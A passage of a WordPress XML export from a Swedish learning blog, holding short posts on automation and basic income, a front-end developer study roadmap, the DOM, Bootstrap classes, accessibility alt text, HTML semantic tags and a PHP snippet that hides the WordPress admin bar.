		<content:encoded><![CDATA[Inom kort kommer de flesta av våra arbeten att tas över av datorer och maskiner. Det är snudd på oundvikligt. Det kommer leda till enorm arbetslöshet, vilket lär skapa en viss oro i samhället.
Lösningen är jättehög skatt som förmedlas som medborgarlön till alla medborgare, så att ingen behöver arbeta. Maskinerna arbetar.

Artiklar
<a href="http://www.nytimes.com/2015/05/17/books/review/rise-of-the-robots-and-shadow-work.html">"Rise of the Robots" and "Shadow Work"</a>
Innehåller en bra beskrivning av människor:

<blockquote>
Finally, all this information will be synthesized with more fairness and erudition than any wet, carbon-based thinking apparatus could muster.</blockquote>

Recension av två böcker som tar upp automatiseringen av arbetslivet, och dess framtid. 

<a href="http://www.nytimes.com/2015/05/24/upshot/what-to-learn-in-college-to-stay-one-step-ahead-of-computers.html?abt=0002&amp;abg=1">What To Lean in College to Stay One Step Ahead of Computers</a>
Kasst innehåll. Intressant tanke, lärarna behövs inte längre.


Dokumentärer på temat
<a href="https://www.youtube.com/watch?v=7Pq-S557XQU&amp;feature=youtu.be">Humans need not apply</a>

]]></content:encoded>
		<excerpt:encoded><![CDATA[]]></excerpt:encoded>
		<wp:post_id>228</wp:post_id>
		<wp:post_date>2015-05-15 14:45:36</wp:post_date>
		<wp:post_date_gmt>2015-05-15 14:45:36</wp:post_date_gmt>
		<wp:comment_status>open</wp:comment_status>
		<wp:ping_status>open</wp:ping_status>
		<wp:post_name>robotkommunism</wp:post_name>
		<wp:status>publish</wp:status>
		<wp:post_parent>0</wp:post_parent>
		<wp:menu_order>0</wp:menu_order>
		<wp:post_type>post</wp:post_type>
		<wp:post_password></wp:post_password>
		<wp:is_sticky>0</wp:is_sticky>
		<category domain="category" nicename="robotkommunism"><![CDATA[robotkommunism]]></category>
		<wp:postmeta>
			<wp:meta_key>_publicize_pending</wp:meta_key>
			<wp:meta_value><![CDATA[1]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>sharing_disabled</wp:meta_key>
			<wp:meta_value><![CDATA[1]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>_rest_api_published</wp:meta_key>
			<wp:meta_value><![CDATA[1]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>_rest_api_client_id</wp:meta_key>
			<wp:meta_value><![CDATA[-1]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>_publicize_job_id</wp:meta_key>
			<wp:meta_value><![CDATA[10960744767]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>original_post_id</wp:meta_key>
			<wp:meta_value><![CDATA[228]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>_wp_old_slug</wp:meta_key>
			<wp:meta_value><![CDATA[228]]></wp:meta_value>
		</wp:postmeta>
	</item>
	<item>
		<title>Front-end developer</title>
		<link>https://stuffidontwanttogoogleagain.wordpress.com/2015/05/15/att-lara-sig-steg-1/</link>
		<pubDate>Fri, 15 May 2015 22:21:38 +0000</pubDate>
		<dc:creator>tidlost</dc:creator>
		<guid isPermaLink="false">https://narcotize.wordpress.com/?p=231</guid>
		<description></description>
		<content:encoded><![CDATA[Guide för att bli en front-end web developer. Infon kommer bland annat <a href="https://www.youtube.com/watch?v=pB0WvcxTbCA&amp;l">härifrån</a>.

<h2>1. Html</h2>

<ul>
<li><strong>--X--</strong>Generella strukturen av en hemsida (html, head, body).</li>
<li><a href="https://narcotize.wordpress.com/2015/05/16/the-document-object-model-dom/"><strong>--X--</strong></a>The Document Object Model (DOM) - Vad det är.</li>
<li><a href="https://narcotize.wordpress.com/2015/05/13/html-taggar/">--X--</a>Taggar - hur man gör</li>
</ul>

<ul>
<li>Hur man strukturerar innehållet på en hemsida med divs (div-based-markup)</li>
<li><a href="https://narcotize.wordpress.com/2015/05/13/html-taggar/">--X--</a>Semantisk markup - Hur det ska användas korrekt.
</li>

<li>--X--Hur man bäddar in en .css-fil i en hemsida.</li>
<ul><li>Att bädda in en .css-fil är inte svårt.
i .html-filen bör refensen skrivas ut såhär:
[code language="html"]
&lt;link rel=&quot;stylesheet&quot; href=&quot;css/style.css&quot;&gt;
[/code]
href-länkadressen skall riktas till den mapp där .css-filen finns. Ibland kan man även se attributet <strong>type="text/css"</strong>, men det är inte nödvändigt längre. Den fyller ingen funktion.
</ul>
<li>Hur man gör att sidan stödjer accessibility compliance, för de som behöver screen readers, t.ex.</li>
<li>Hantera stora bakgrundsbilder</li>
</ul>


<h2>2. CSS</h2>


<ul>
<li><h3>--X--Grundläggande terminologi:</h3></li>
<ul>
<li>Selector - en selector kan vara en tag eller en klass.</li>
<li>Attribut - attributet är den del av selectorn som förändras. Alltså color, border, font etc. Dokumentationen av alla css-attribut som finns <a href="https://developer.mozilla.org/en-US/docs/Web/CSS/Reference">här.</a></li>
<li>Value - alltså värdet som attributet får. Om attributet är color så är värdet grön.
Exempel:
[code language="css"]
p {
color: red;
}
[/code]</li>
</ul> 
<li>Hur man når ett specifikt element på en sida, på olika djup (t.ex a span inom div).</li>
<li><a href="http://stackoverflow.com/questions/8969381/what-is-the-difference-between-display-inline-and-display-inline-block">--X--</a>Displaying elements - block, inline-block och inline.</li>
<li>Style attribut som kan avgör colors, fontar, borders.</li>
<li>--X--Positionering (relative, absolute, fixed) och <a href="https://www.youtube.com/watch?v=xara4Z1b18I">floating elements</a>.</li>
<li><strong>--X--</strong>The box model, margin/padding, och vad box-sizing: border-box gör.</li>
<li>Ids (#id) vs classes (.class) och CSS selectors.</li>
<li>CSS specificity, när vissa styles överride andra styles.</li>
<li>Responsive design - Vad är det? Vad är media queries och hur använder man dom?</li>
<li>CSS3: border-radius, box-shadow, text-shadow.</li>
</ul>

<h3>SASS, LESS - CSS compilers</h3>

<h3>CSS Framework / Bootstrap/Foundation</h3>



<h2>3. jQuery</h2>

jQuery är ett JavaScript-bibliotek som har skapats av John Resig. 

<strong>Saker att lära sig</strong>
<ul>
<li>$(document).ready(function() { }); </li>
<li>Vad $(this) representerar (wrapping a DOM element as a jQuery object, which can then be manipulated using jQuery commands)</li>
<li>Hur man väljer classes and ids. </li>
<li>God kännedom om api.jquery.com och hur man hitta olika funktioner.</li>
<li>Hur man använder olika effekter (fade, slide, hide, show, etc.)</li>
<li>Traversing the DOM tree (children(), parents(), find(), etc.)</li>
<li>Chaining commands</li>
<li>How to respond to and trigger events</li>
<li>Vad betyder det för någonting att vara asynchronous?</li>
<li>Hur debuggar man jQuery-buggar? Vad är console.log() och `debugger` kommandot? Hur kan man sätta <li>breakpoints i JavaScript-filer och step in/over them?</li>
<li>Vad är JSON och hur ser ett JSON response ut. </li>
<li>Vad är AJAX?</li>
<li>Hur man tar emot data från API via AJAX och parsar datan till DOM?</li>
</ul>

<h2>4. JavaScript</h2>
Ett måste att lära sig. När ett javascript eller jQuery inte funkar så måste man kunna JS för att lösa problemet. Det är oundvikligt.

<h3>Saker att veta</h3>
<ul>
<li>Vad man menar med "everything is an object?"</li>
<p>I JavaScript finns det fem olika primitiva data. Dessa är: string, number, boolean, undefined, null. All annan data är object data. Arrays och Object är object-data.
En skillnad mellan primitiv data och Object-data är hur datan sparas. I primitiv data så sparas datan direkt i en variabel.
[code lang="js"]
var namn = &quot;Philip&quot;;
[/code]
I exemplet ovan så sparas alltså stringen "Philip" i variabeln namn. Notera följande exempel:
[code lang="js"]
var namn = &quot;Philip&quot;;
var namn2 = namn;
namn = &quot;Tor&quot;;
console.log(namn) //&quot;Tor&quot;;
console.log(namn2); //&quot;Philip&quot;
[/code]
Här ändrar vi alltså innehållet i den ursprungliga variabeln. Men det spelar ingen roll för kopian, för den behåller det gamla värdet.
[code lang="js"]
var namnLista = [&quot;Philip&quot;, &quot;Tor&quot;, &quot;Lars&quot;];
var namnLista2 = namnLista;
namnLista2[0] = &quot;Johan&quot;;
console.log(namnLista);//[&quot;Johan&quot;, &quot;Tor&quot;, &quot;Lars&quot;]
console.log(namnLista2);//[&quot;Johan&quot;, &quot;Tor&quot;, &quot;Lars&quot;]
[/code]
Eftersom en array är ett object så hanteras datan på ett annat sätt. Object-data hänvisas till en viss plats i minnet. En variabel innehåller alltså inte någon data, utan endast en referens till en plats i minnet. Och eftersom denna plats är densamma så ändras alltså båda Arraysen i exemplet ovan genom att endast ändra en array.

Men, det finns en annan viktig poäng här. Det är att även om primtiv data såsom number, string och boolean endast är primitiv data så kan man ändå använda Objects methods på dem. .length till exempel är en property av ett object. Och length kan ju användas på strings, så hur är det då möjligt? Hur är det möjligt att använda en method på en primitiv data? Jo, det är så att JavaScript ovandlar en string till ett object, och använder metoden .length på den. Och sedan ovandlar tillbaka stringen till en primitiv data igen. På så sätt kan man använda sig av methods på primitiv data. 

Så, men andra ord. Allting är inte ett objekt. Primitiv data är primitiv data. Object-data är Object.

<li>Vad är en callback och varför är det viktigt?</li>
<li>Global scope, function scopes, vad är the global namespace och varför kan det vara dåligt?</li>
<li>Namespacing din kod och varför</li>
<li>Closures</li>
<li>Object-oriented JavaScript</li>
<li>(OO JS) Prototypal inheritance</li>
</ul>

<h2>Generella saker</h2>
<h3>Optimering</h3>
<ul>
<li><a href="https://narcotize.wordpress.com/2015/07/31/koppla-upp-en-sida-mot-cloudflare/">Cloudflare</a></li>
<li><strong><a href="https://narcotize.wordpress.com/2015/07/31/cache-och-optimering-av-hemsida/">--X--</a></strong>Optimering av hemsida vid hög trafik</li>
</ul>
<h3>Säkerhet</h3>
<ul>
<li>Hur fungerar SQL-injections och hur undviker man dom</li>
<li>Hur man sätter upp SSL/HTTPS för att kryptera information</li>
</ul>

<h3>5. Generella saker att kunna</h3>

Verktyg: <strong>--X--</strong>Hur man inspekterar en hemsida med hjälp av firebug (firefox)
<h3>Local utvecklingsmiljö</h3>
<ul>
<li><strong>--X--</strong>Sätta upp en lokal utvecklingsmiljö. XAMP.</li>
<li>Hur man sätter upp en E-commerce plattform</li>
</ul>
<h3>Versionhantering/GitHub</h3>
<ul>
<li><a href="https://narcotize.wordpress.com/2015/05/18/grunderna-i-git/">--X--</a>Git</li>
</ul>

<h3>FTP</h3>

<h3>Basic terminal usage</h3>

<h3>SSH</h3>

<h3>Learn how client and server talk to each other</h3>

<h3>RESTful web services</h3>
<p>POST GET PUT DELET requests</p>

<strong>Resurser</strong>
<a href="https://www.edx.org/course/introduction-bootstrap-tutorial-microsoft-dev203x">Bootstrap</a> hos edX. 
<a href="https://www.udacity.com/course/front-end-web-developer-nanodegree--nd001">Front-end web developer Udacity</a>]]></content:encoded>
		<excerpt:encoded><![CDATA[]]></excerpt:encoded>
		<wp:post_id>231</wp:post_id>
		<wp:post_date>2015-05-15 22:21:38</wp:post_date>
		<wp:post_date_gmt>2015-05-15 22:21:38</wp:post_date_gmt>
		<wp:comment_status>open</wp:comment_status>
		<wp:ping_status>open</wp:ping_status>
		<wp:post_name>att-lara-sig-steg-1</wp:post_name>
		<wp:status>publish</wp:status>
		<wp:post_parent>0</wp:post_parent>
		<wp:menu_order>0</wp:menu_order>
		<wp:post_type>post</wp:post_type>
		<wp:post_password></wp:post_password>
		<wp:is_sticky>0</wp:is_sticky>
		<category domain="category" nicename="web-utveckling"><![CDATA[web-utveckling]]></category>
		<wp:postmeta>
			<wp:meta_key>_publicize_pending</wp:meta_key>
			<wp:meta_value><![CDATA[1]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>sharing_disabled</wp:meta_key>
			<wp:meta_value><![CDATA[1]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>_rest_api_published</wp:meta_key>
			<wp:meta_value><![CDATA[1]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>_rest_api_client_id</wp:meta_key>
			<wp:meta_value><![CDATA[-1]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>_publicize_job_id</wp:meta_key>
			<wp:meta_value><![CDATA[13287901400]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>original_post_id</wp:meta_key>
			<wp:meta_value><![CDATA[231]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>_wp_old_slug</wp:meta_key>
			<wp:meta_value><![CDATA[231]]></wp:meta_value>
		</wp:postmeta>
	</item>
	<item>
		<title>The Document Object Model (DOM)</title>
		<link>https://stuffidontwanttogoogleagain.wordpress.com/2015/05/16/the-document-object-model-dom/</link>
		<pubDate>Sat, 16 May 2015 18:05:40 +0000</pubDate>
		<dc:creator>tidlost</dc:creator>
		<guid isPermaLink="false">https://narcotize.wordpress.com/?p=244</guid>
		<description></description>
		<content:encoded><![CDATA[DOM är en model över hur olika objekt i ett dokument förhåller sig till varandra.

Varje objekt är en node. Här är ett exempel
[code language="html"]
&lt;p&gt;Här är text&lt;/p&gt;
[/code]

Den här koden består av två noder. Ett element (p) och en text-node (Här är text). Text-noden anses vara child-node i förhållande till (p) eftersom den är nested inom p.

[code language="html"]
&lt;p&gt;Här är &lt;strong&gt;text&lt;/strong&gt;&lt;/p&gt;
[/code]

I denna kod har p fått ett till child, nämligen (strong). Strong har i sin tur fått ett barn "text".

Sen finns det attribute-node. Som till exempel:


[code language="html"]
&lt;p ALIGN=&quot;right&quot;&gt;Här är &lt;strong&gt;text&lt;/strong&gt;&lt;/p&gt;
[/code]

ALIGN är här ett tredje exempel på en node.
De tre vanligaste noderna är alltså <strong>element-node</strong>, <strong>text-note</strong> och <strong>attribute-node</strong>, även whitespace mellan taggar är text-noder. Kan vara bra att känna till.

Så hela html-dokumentet kan förstås som ett träd.

Att förstå hur dessa noder hänger ihop är viktigt för att kunna manipulera dem, något som oftast görs med hjälp av JavaScript.

För mer om detta. <a href="http://www.quirksmode.org/dom/intro.html">Länk.</a> 
En <a href="https://www.youtube.com/watch?v=TmQ_v5LsakQ">bra video</a> som förklarar DOM.]]></content:encoded>
		<excerpt:encoded><![CDATA[]]></excerpt:encoded>
		<wp:post_id>244</wp:post_id>
		<wp:post_date>2015-05-16 18:05:40</wp:post_date>
		<wp:post_date_gmt>2015-05-16 18:05:40</wp:post_date_gmt>
		<wp:comment_status>open</wp:comment_status>
		<wp:ping_status>open</wp:ping_status>
		<wp:post_name>the-document-object-model-dom</wp:post_name>
		<wp:status>publish</wp:status>
		<wp:post_parent>0</wp:post_parent>
		<wp:menu_order>0</wp:menu_order>
		<wp:post_type>post</wp:post_type>
		<wp:post_password></wp:post_password>
		<wp:is_sticky>0</wp:is_sticky>
		<category domain="category" nicename="web-utveckling"><![CDATA[web-utveckling]]></category>
		<wp:postmeta>
			<wp:meta_key>_publicize_pending</wp:meta_key>
			<wp:meta_value><![CDATA[1]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>_publicize_pending</wp:meta_key>
			<wp:meta_value><![CDATA[1]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>sharing_disabled</wp:meta_key>
			<wp:meta_value><![CDATA[1]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>_rest_api_published</wp:meta_key>
			<wp:meta_value><![CDATA[1]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>_rest_api_client_id</wp:meta_key>
			<wp:meta_value><![CDATA[-1]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>original_post_id</wp:meta_key>
			<wp:meta_value><![CDATA[244]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>_wp_old_slug</wp:meta_key>
			<wp:meta_value><![CDATA[244]]></wp:meta_value>
		</wp:postmeta>
	</item>
	<item>
		<title>Bootstrap-klasser att känna till</title>
		<link>https://stuffidontwanttogoogleagain.wordpress.com/2015/05/24/bootstrap-klasser-att-kanna-till/</link>
		<pubDate>Sun, 24 May 2015 17:00:16 +0000</pubDate>
		<dc:creator>tidlost</dc:creator>
		<guid isPermaLink="false">https://narcotize.wordpress.com/?p=329</guid>
		<description></description>
		<content:encoded><![CDATA[Vissa klasser för bootstrap måste man helt enkelt memorera för att skynda på arbetet. Här är några.


<h2>Bilder<h2>
[code language="html"]
&lt;img src=&quot;bild.jpg&quot; class=&quot;img-responsive&quot;&gt;
[/code]

Det är inte mer komplicerat än att bilden blir responsiv. För mer info om klassen se <a href="http://getbootstrap.com/css/#images">bootstraps dokumentation</a>.

<h3>Centrera bild</h3>
Om du vill centera bilden så använd .center-block iställer för .text-center.

<h2>Text</h2>
Om du vill positionerna texten så anväd dessa klasser.

[code language="html"]
&lt;p class=&quot;text-left&quot;&gt;Left aligned text.&lt;/p&gt;
&lt;p class=&quot;text-center&quot;&gt;Center aligned text.&lt;/p&gt;
&lt;p class=&quot;text-right&quot;&gt;Right aligned text.&lt;/p&gt;
&lt;p class=&quot;text-justify&quot;&gt;Justified text.&lt;/p&gt;
&lt;p class=&quot;text-nowrap&quot;&gt;No wrap text.&lt;/p&gt;
[/code]

Om du vill göra en viss text med stora bokstäver eller bara små använd följande klasser.


[code language="html"]
&lt;p class=&quot;text-lowercase&quot;&gt;Lowercased text.&lt;/p&gt;
&lt;p class=&quot;text-uppercase&quot;&gt;Uppercased text.&lt;/p&gt;
&lt;p class=&quot;text-capitalize&quot;&gt;Capitalized text.&lt;/p&gt;[/code]]]></content:encoded>
		<excerpt:encoded><![CDATA[]]></excerpt:encoded>
		<wp:post_id>329</wp:post_id>
		<wp:post_date>2015-05-24 17:00:16</wp:post_date>
		<wp:post_date_gmt>2015-05-24 17:00:16</wp:post_date_gmt>
		<wp:comment_status>open</wp:comment_status>
		<wp:ping_status>open</wp:ping_status>
		<wp:post_name>bootstrap-klasser-att-kanna-till</wp:post_name>
		<wp:status>publish</wp:status>
		<wp:post_parent>0</wp:post_parent>
		<wp:menu_order>0</wp:menu_order>
		<wp:post_type>post</wp:post_type>
		<wp:post_password></wp:post_password>
		<wp:is_sticky>0</wp:is_sticky>
		<category domain="category" nicename="bootstrap"><![CDATA[bootstrap]]></category>
		<category domain="category" nicename="web-utveckling"><![CDATA[web-utveckling]]></category>
		<wp:postmeta>
			<wp:meta_key>_publicize_pending</wp:meta_key>
			<wp:meta_value><![CDATA[1]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>sharing_disabled</wp:meta_key>
			<wp:meta_value><![CDATA[1]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>_rest_api_published</wp:meta_key>
			<wp:meta_value><![CDATA[1]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>_rest_api_client_id</wp:meta_key>
			<wp:meta_value><![CDATA[-1]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>_publicize_job_id</wp:meta_key>
			<wp:meta_value><![CDATA[10964176884]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>original_post_id</wp:meta_key>
			<wp:meta_value><![CDATA[329]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>_wp_old_slug</wp:meta_key>
			<wp:meta_value><![CDATA[329]]></wp:meta_value>
		</wp:postmeta>
	</item>
	<item>
		<title>Html-boilerplate</title>
		<link>https://stuffidontwanttogoogleagain.wordpress.com/2015/05/24/html-boilerplate/</link>
		<pubDate>Sun, 24 May 2015 17:29:56 +0000</pubDate>
		<dc:creator>tidlost</dc:creator>
		<guid isPermaLink="false">https://narcotize.wordpress.com/?p=334</guid>
		<description></description>
		<content:encoded><![CDATA[Grundstrukturen för alla html-dokument]]></content:encoded>
		<excerpt:encoded><![CDATA[]]></excerpt:encoded>
		<wp:post_id>334</wp:post_id>
		<wp:post_date>2015-05-24 17:29:56</wp:post_date>
		<wp:post_date_gmt>2015-05-24 17:29:56</wp:post_date_gmt>
		<wp:comment_status>open</wp:comment_status>
		<wp:ping_status>open</wp:ping_status>
		<wp:post_name>html-boilerplate</wp:post_name>
		<wp:status>publish</wp:status>
		<wp:post_parent>0</wp:post_parent>
		<wp:menu_order>0</wp:menu_order>
		<wp:post_type>post</wp:post_type>
		<wp:post_password></wp:post_password>
		<wp:is_sticky>0</wp:is_sticky>
		<category domain="category" nicename="html"><![CDATA[html]]></category>
		<wp:postmeta>
			<wp:meta_key>_publicize_pending</wp:meta_key>
			<wp:meta_value><![CDATA[1]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>sharing_disabled</wp:meta_key>
			<wp:meta_value><![CDATA[1]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>_rest_api_published</wp:meta_key>
			<wp:meta_value><![CDATA[1]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>_rest_api_client_id</wp:meta_key>
			<wp:meta_value><![CDATA[-1]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>_publicize_job_id</wp:meta_key>
			<wp:meta_value><![CDATA[10964909220]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>original_post_id</wp:meta_key>
			<wp:meta_value><![CDATA[334]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>_wp_old_slug</wp:meta_key>
			<wp:meta_value><![CDATA[334]]></wp:meta_value>
		</wp:postmeta>
	</item>
	<item>
		<title>Screen-reader friendly</title>
		<link>https://stuffidontwanttogoogleagain.wordpress.com/2015/05/24/screen-reader-friendly/</link>
		<pubDate>Sun, 24 May 2015 17:36:48 +0000</pubDate>
		<dc:creator>tidlost</dc:creator>
		<guid isPermaLink="false">https://narcotize.wordpress.com/?p=337</guid>
		<description></description>
		<content:encoded><![CDATA[Samling av info som gäller hur man gör en hemsida screen-reader friendly. För att alla ska kunna ta del av din hemsida.

<h3>IMG</h3>
Bilder. 
[code language="html"]
&lt;img src=&quot;bild.jpg&quot; alt=&quot;Bild på katt&quot;&gt; 
[/code]

Kom ihåg att alltid skriva ut alt eftersom det är viktigt för synskadade. Synskadades hjälpmedel läser upp vad som står i alt-attributet. ]]></content:encoded>
		<excerpt:encoded><![CDATA[]]></excerpt:encoded>
		<wp:post_id>337</wp:post_id>
		<wp:post_date>2015-05-24 17:36:48</wp:post_date>
		<wp:post_date_gmt>2015-05-24 17:36:48</wp:post_date_gmt>
		<wp:comment_status>open</wp:comment_status>
		<wp:ping_status>open</wp:ping_status>
		<wp:post_name>screen-reader-friendly</wp:post_name>
		<wp:status>publish</wp:status>
		<wp:post_parent>0</wp:post_parent>
		<wp:menu_order>0</wp:menu_order>
		<wp:post_type>post</wp:post_type>
		<wp:post_password></wp:post_password>
		<wp:is_sticky>0</wp:is_sticky>
		<category domain="category" nicename="screen-reader"><![CDATA[screen-reader]]></category>
		<wp:postmeta>
			<wp:meta_key>_publicize_pending</wp:meta_key>
			<wp:meta_value><![CDATA[1]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>sharing_disabled</wp:meta_key>
			<wp:meta_value><![CDATA[1]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>_rest_api_published</wp:meta_key>
			<wp:meta_value><![CDATA[1]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>_rest_api_client_id</wp:meta_key>
			<wp:meta_value><![CDATA[-1]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>_publicize_job_id</wp:meta_key>
			<wp:meta_value><![CDATA[10965080912]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>original_post_id</wp:meta_key>
			<wp:meta_value><![CDATA[337]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>_wp_old_slug</wp:meta_key>
			<wp:meta_value><![CDATA[337]]></wp:meta_value>
		</wp:postmeta>
	</item>
	<item>
		<title>Ta bort wordpress admin-bar</title>
		<link>https://stuffidontwanttogoogleagain.wordpress.com/2015/05/25/ta-bort-wordpress-admin-bar/</link>
		<pubDate>Mon, 25 May 2015 20:43:37 +0000</pubDate>
		<dc:creator>tidlost</dc:creator>
		<guid isPermaLink="false">https://narcotize.wordpress.com/?p=340</guid>
		<description></description>
		<content:encoded><![CDATA[Om man är inloggad på wordpress samtidigt som man besöker antingen sin egen sida eller någon annan wordpress-sida så finns det en admin-bar längst upp på sidan. Den är ful å onödig. För att ta bort den lägg in följande kod i functions.php.

[code language="php"]

&lt;?php
add_action('get_header', 'remove_admin_login_header');
function remove_admin_login_header() {
	remove_action('wp_head', '_admin_bar_bump_cb');
}
?&gt;

[/code]
]]></content:encoded>
		<excerpt:encoded><![CDATA[]]></excerpt:encoded>
		<wp:post_id>340</wp:post_id>
		<wp:post_date>2015-05-25 20:43:37</wp:post_date>
		<wp:post_date_gmt>2015-05-25 20:43:37</wp:post_date_gmt>
		<wp:comment_status>open</wp:comment_status>
		<wp:ping_status>open</wp:ping_status>
		<wp:post_name>ta-bort-wordpress-admin-bar</wp:post_name>
		<wp:status>publish</wp:status>
		<wp:post_parent>0</wp:post_parent>
		<wp:menu_order>0</wp:menu_order>
		<wp:post_type>post</wp:post_type>
		<wp:post_password></wp:post_password>
		<wp:is_sticky>0</wp:is_sticky>
		<category domain="category" nicename="web-utveckling"><![CDATA[web-utveckling]]></category>
		<category domain="category" nicename="wordpress"><![CDATA[wordpress]]></category>
		<wp:postmeta>
			<wp:meta_key>_publicize_pending</wp:meta_key>
			<wp:meta_value><![CDATA[1]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>sharing_disabled</wp:meta_key>
			<wp:meta_value><![CDATA[1]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>_rest_api_published</wp:meta_key>
			<wp:meta_value><![CDATA[1]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>_rest_api_client_id</wp:meta_key>
			<wp:meta_value><![CDATA[-1]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>_publicize_job_id</wp:meta_key>
			<wp:meta_value><![CDATA[11004566997]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>original_post_id</wp:meta_key>
			<wp:meta_value><![CDATA[340]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>_wp_old_slug</wp:meta_key>
			<wp:meta_value><![CDATA[340]]></wp:meta_value>
		</wp:postmeta>
	</item>
	<item>
		<title>Html-taggar</title>
		<link>https://stuffidontwanttogoogleagain.wordpress.com/2015/05/13/html-taggar/</link>
		<pubDate>Wed, 13 May 2015 16:00:10 +0000</pubDate>
		<dc:creator>tidlost</dc:creator>
		<guid isPermaLink="false">https://narcotize.wordpress.com/?p=210</guid>
		<description></description>
		<content:encoded><![CDATA[Det är viktigt att komma ihåg att taggarna ska användas på rätt sätt. Att använda section, article istället för en div hjälper sökmotorer, en person som enkelt försöker förstå koden, webbläsare och accessibility-tools att förstå hemsidan bättre. Respektera dom. Om du inte vet vilken tag som passar bäst så kan du följa den här <a href="http://html5doctor.com/downloads/h5d-sectioning-flowchart.png">flow-charten</a>. Här är en bra <a href="http://html5doctor.com/lets-talk-about-semantics/">artikel</a> på detta tema.
Exempel, om du vill göra en några ord indenterade så ska du inte använda taggen <strong>blockquote</strong>, eftersom blockquote betyder att texten är ett citat. Om den är semantiskt dåligt skriven kan t.ex. synskadade användaren tvingas höra massa onödigt.

Man kan helt enkelt säga att semantic markup behövs för att hjälpa maskinerna att förstå nyanserna i människornas språk.
 
<img src="http://html5doctor.com/downloads/h5d-sectioning-flowchart.png" alt="flowchart" />

<h2>Taggar</h2>
<strong>article</strong>
Tänk inte på article som en tidningsartikel, utan som en sortimentartikel. En produkt, ett objekt. 
<strong>section</strong>
<strong>nav</strong>
<strong>figure</strong>
<strong>aside</strong>
Inte samma sak som en sidebar. Utan snarare som en sido-del i en artikel. Någonting som relaterar till artiklen.
<strong>footer</strong>
<strong>header</strong>

<h3>hr</h3>
HR står för horizontal rules och betyder helt enkelt horizontal linje. Det är en avgränsare som ofta används.

<h3>IMG</h3>

Bilder ska befinna sig inom figure-tagen. Glöm inte figcaption om du vill ha caption-text. 

[code language="html"]

&lt;figure&gt;
&lt;img src=&quot;bild.jpg&quot;
alt=&quot;Bild på katt&quot;
heigh=&quot;200px&quot; width=&quot;200px&quot;
title=&quot;namn på bilden&quot;&gt;

&lt;figcaption&gt;Här är en text som kommer under bilden. &lt;/figcaption&gt;
&lt;figure&gt; 
[/code]

Kom ihåg att alltid skriva ut alt eftersom det är viktigt för synskadade. Synskadades hjälpmedel läser upp vad som står i alt-attributet. För mer om hur du gör din sida screen-reader-friendly se <a href="https://narcotize.wordpress.com/2015/05/24/screen-reader-friendly/">här</a>.

<h3>!DOCTYPE</h3>
Tagen är ingen html-tag. Det är information som browsern förstår vilket gör att den vet vilket typ av dokument som den ska läsa, och vilken version. Om html-dokumentet är skrivet i html5 så räcker taggen [code language="html"] &lt;!DOCTYPE html&gt; [/code], om det är skrivet i html4, så kolla <a href="http://www.w3schools.com/tags/tag_doctype.asp">här</a>. För det mesta spelar det ingen roll, men om du vill vara säker på att din sida ser ut som den ska göra så lägg till !DOCTYPE.

<h3>Tables</h3>

Tables är viktigt för att göra kolumner och rader.


<h3>Forms</h3>
[code lang="html"]
&lt;form&gt;
&lt;input type=&quot;text&quot;&gt;

&lt;/input&gt;
&lt;/form&gt;
[/code]
<h3>Div</h3>

